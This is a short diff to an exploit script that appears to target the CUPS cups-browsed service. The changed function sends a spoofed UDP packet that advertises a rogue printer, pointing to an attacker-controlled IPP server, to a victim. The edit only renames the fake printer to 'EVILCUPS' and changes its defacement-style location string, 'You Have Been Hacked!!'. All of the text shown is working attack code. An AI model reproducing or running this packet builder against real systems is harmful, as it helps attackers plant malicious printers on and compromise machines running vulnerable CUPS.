@@ -188,8 +188,8 @@ def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printer_name
     print(f"Sending udp packet to {ip}:{port}...")
     printer_type = 2
     printer_state = '3'
-    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/SECUNACUPS'
-    printer_location = '"You Have Been Hacked By S3cUn4!!"'
+    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
+    printer_location = '"You Have Been Hacked!!"'
     printer_info = f'"{printer_name}"'
     printer_model = '"HP LaserJet 1020"'
     packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
